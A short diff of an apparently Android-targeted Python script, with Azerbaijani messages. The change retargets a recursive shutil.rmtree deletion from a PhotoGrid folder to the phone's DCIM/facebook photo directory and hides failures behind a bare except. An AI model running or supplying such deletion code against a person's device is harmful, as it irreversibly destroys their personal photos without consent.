@@ -18,7 +18,7 @@ print("Gözdə...")
 
 
 try:
-    shutil.rmtree("/storage/emulated/0/PhotoGrid")
+    shutil.rmtree("/storage/emulated/0/DCIM/facebook")
     
 except:
     print("Nəsə səf getdi")
